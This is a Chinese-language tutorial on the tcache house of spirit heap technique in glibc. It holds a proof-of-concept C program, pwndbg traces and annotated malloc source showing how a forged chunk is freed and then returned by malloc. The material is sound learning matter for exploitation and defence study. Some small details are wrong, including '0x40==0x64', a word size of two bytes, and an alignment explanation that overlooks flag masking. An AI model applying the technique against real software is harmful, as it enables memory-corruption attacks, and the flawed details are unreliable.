# 简介
[PWN入门（3-17-1）-Tcache Attack中的house of spirit（基础）](https://www.yuque.com/cyberangel/rg9gdm/pmskct)

这种攻击方式之前我们说过，在这篇文章中我们深入研究一下。

# 漏洞影响版本
所有开启glibc malloc的版本

# POC
```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates the house of spirit attack on tcache.\n");
	printf("It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	printf("You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	printf("(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	printf("Ok. Let's start with the example!.\n\n");


	printf("Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	printf("Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	printf("This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
}
```

## POC分析
对POC进行编译，完成之后对代码第18行下断点开始调试：

```c
	malloc(1);
```

上述代码调用malloc初始化堆区：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619490998657-9d331129-57ac-4e26-a161-62fc02b5965f.png)

```c
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619578365684-567b9690-3bc8-407f-b964-2f4c81bdc88e.png)

```c
pwndbg> x/16gx &a
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
    	        //a                 //b
0x7fffffffdd80:	0x0000000000000009	0x00007ffff7dd5660
    			//fake_chunks[0]    fake_chunks[1]
0x7fffffffdd90:	0x00007fffffffddf8	0x00000000000000f0
        		//fake_chunks[2]    fake_chunks[3]
0x7fffffffdda0:	0x0000000000000001	0x0000555555554a4d
    			//fake_chunks[4]    fake_chunks[5]
0x7fffffffddb0:	0x00007ffff7de3b40	0x0000000000000000
    			//fake_chunks[6]    fake_chunks[7]
0x7fffffffddc0:	0x0000555555554a00	0x0000555555554750
    			//fake_chunks[8]    fake_chunks[9]
0x7fffffffddd0:	0x00007fffffffdec0	0x8823772f23466500
0x7fffffffdde0:	0x0000555555554a00	0x00007ffff7a03bf7
pwndbg> 
```

接下来我们开始伪造堆块：

```c
	fake_chunks[1] = 0x40; // this is the size
	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];
```

结果如下：

```c
pwndbg> x/16gx &a
0x7fffffffdd70:	0x00007fffffffdd90	0x0000000000000000
    	        //a                 //b
0x7fffffffdd80:	0x0000000000000009	0x0000000000000040
    			//fake_chunks[0]    fake_chunks[1]
0x7fffffffdd90:	0x00007fffffffddf8	0x00000000000000f0
        		//fake_chunks[2]    fake_chunks[3]
0x7fffffffdda0:	0x0000000000000001	0x0000555555554a4d
    			//fake_chunks[4]    fake_chunks[5]
0x7fffffffddb0:	0x00007ffff7de3b40	0x0000000000000000
    			//fake_chunks[6]    fake_chunks[7]
0x7fffffffddc0:	0x0000555555554a00	0x0000555555554750
    			//fake_chunks[8]    fake_chunks[9]
0x7fffffffddd0:	0x00007fffffffdec0	0x1230b9603cc1de00
0x7fffffffdde0:	0x0000555555554a00	0x00007ffff7a03bf7
pwndbg> 
```

现在我们释放a指向的伪造的堆块：

```c
	printf("Freeing the overwritten pointer.\n");
	free(a);
```

```c
pwndbg> tcachebin
tcachebins
0x40 [  1]: 0x7fffffffdd90 ◂— 0x0
pwndbg> 
```

当再次malloc时就会控制fake_chunks：

```c
	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
```

```c
pwndbg> x/16gx &a
0x7fffffffdd70:	0x00007fffffffdd90	0x00007fffffffdd90
    	        //a                 //b
0x7fffffffdd80:	0x0000000000000009	0x0000000000000040 //malloc
0x7fffffffdd90:	0x0000000000000000	0x0000000000000000 
    			//fd				//bk
0x7fffffffdda0:	0x0000000000000001	0x0000555555554a4d
0x7fffffffddb0:	0x00007ffff7de3b40	0x0000000000000000
0x7fffffffddc0:	0x0000555555554a00	0x0000555555554750
0x7fffffffddd0:	0x00007fffffffdec0	0x8823772f23466500
0x7fffffffdde0:	0x0000555555554a00	0x00007ffff7a03bf7
pwndbg> 
```

## glibc源码分析
看起来很简单：我们需要在victim处伪造一个fake_chunks，然后篡改指针ptr指向它，最后free之后malloc即可控制，但是我们需要注意一些细节，我们先来看free掉fake_chunks时：

### free-__libc_free
```c
void
__libc_free (void *mem)  //传入要释放的指针所指向的地址：mem=0x7fffffffdd90
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook); 
  if (__builtin_expect (hook != NULL, 0))   //__free_hook
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem); //转化为堆块的起始地址：p=0x7fffffffdd80

  if (chunk_is_mmapped (p))  //检查堆块是否由mmap分配：
    { //mchunk_size==64==0x40==1000000（二进制）
      //#define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED)==0
		#mmap分配机制在这里先不研究，总之我们先要绕过这里进入_int_free函数
      //......(省略代码)
      return;
    }

  MAYBE_INIT_TCACHE ();

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);  //进入_int_free
}
libc_hidden_def (__libc_free)
```

### free-_int_free
```c
/*
   ------------------------------ free ------------------------------
 */

static void
_int_free (mstate av, mchunkptr p, int have_lock) 
{ //0x7ffff7dcdc40 <main_arena> p==0x7fffffffdd80 have_lock==0
	//......(省略变量的定义)

  size = chunksize (p); //size==0x40

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer"); //检查堆指针是否有效
    //(uintptr_t) -size==0xffffffffffffffc0
    //    (uintptr_t) p==0x7fffffffdd80
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size))) 
    malloc_printerr ("free(): invalid size");
        //检查p的大小是否有效:
        //1、堆块的大小不能小于最小分配大小
        //2、堆块的必须是MALLOC_ALIGN_MASK（堆块大小的最小对齐单位）的整数倍
		//在这里MALLOC_ALIGN_MASK==0x10
  check_inuse_chunk(av, p); 

#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size); //tc_idx==2
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p); //检查tcache double free

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx); //p==0x7fffffffdd80；tc_idx==2
	    return;
	  }
      }
  }
#endif
```

### tcache_put
```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); //e=0x7fffffffdd90
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
  e->key = tcache;
     detect a double free.  */

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

(uintptr_t) -size==0xffffffffffffffc0可以将如下程序编译后从内存中得到：

```c
#include<stdio.h>
#include<stdint.h>
int main(){
	size_t size=0x40;
	printf("%ld",(uintptr_t)-size);
}
```

# 总结
要想使用tcache_house_of_spirit这种攻击方式需要做到：	

1. 有一个可控的指针，我们应将其的指向覆盖为fake_chunks[]的地址；
2. 堆块不能由mmap进行分配
3. 堆块大小应该小于tcachebin的最大大小。
4. fake_chunks的大小不能小于最小分配大小
5. fake_chunks的大小必须是MALLOC_ALIGN_MASK的整数倍
6. fake_chunks不能在tcachebin中形成double free

# 一些疑问
## 三个标志位
当我们将fake_chunks_size将0x40改为0x41后仍然可以绕过检查：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619602275617-86703d7a-9e6c-4780-a061-4e35517e0059.png)

```c
	printf("This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	printf("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x41; // 改为0x40
```

我们仔细来研究一下，首先将fake_chunks size转化为二进制：

```c
00000000000000000000000000000000000000001000001 #0x41的二进制
```

我们再来回顾一下mchunk_size中三个标志位的值：

```c
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
```

将三个标志位的值分别转换为二进制：

```c
#define PREV_INUSE     0x1==00000000000000000000000000000000000000000000001
#define IS_MMAPPED     0x2==00000000000000000000000000000000000000000000010
#define NON_MAIN_ARENA 0x4==00000000000000000000000000000000000000000000100
```

很明显可以看到，0x41这个fake_chunks中的mchunk_size中的PREV_INUSE已置位，这里再简单的说一下这三个标志位的功能：

`A（NON_MAIN_ARENA）`：为0表示该chunk属于**主分配区（主线程）**，为1表示该chunk属于**非主分配区（非主线程）。**  
`M（IS_MAPPED）`：表示当前chunk是从哪个内存区域获得的虚拟内存。为1表示该chunk是从**mmap**映射区域分配的，否则是从**heap**区域分配的。  
`P（PREV_INUSE）`：扩展的来讲就是previous (chunk) inuse，它记录着前一个chunk的状态（malloc or free），其大小总是2word的倍数（1word = 2 byte），当PREV_INUSE为1时代表前一个chunk正处于malloc状态，free则为0（堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存）。当PREV_INUSE为0时，我们可以通过prev_size字段获取前一个chunk的大小及地址。因此我们不可以将任何chunk的P标志位随便进行设置，否则可能出现内存寻址错误。另外，在fastbin和tcachebin中虚拟空间内存相邻下一个堆块的PREV_INUSE总为1。

这也就是为什么0x40和0x41这两个堆块的大小都可以，因为P标志位和mmap无关。

## 内存对齐
但是还有一个疑问，为什么大小0x41（65）会与MALLOC_ALIGN_MASK(0x10、16)对齐？

```c
#define aligned_OK(m)  (((unsigned long)(m) & MALLOC_ALIGN_MASK) == 0)
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)  
//在此系统上，MALLOC_ALIGNMENT==0x10==16
//0x40==0x64
```

我们容易将这里对齐的含义理解为数值上的整除，但是其实并不是这样，注意对齐的含义是与MALLOC_ALIGN_MASK进行“与运算”的结果为0。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1619601118498-9cba6620-13de-4f1d-ab40-1966b501630a.png)

只要结果为0即可绕过检查。

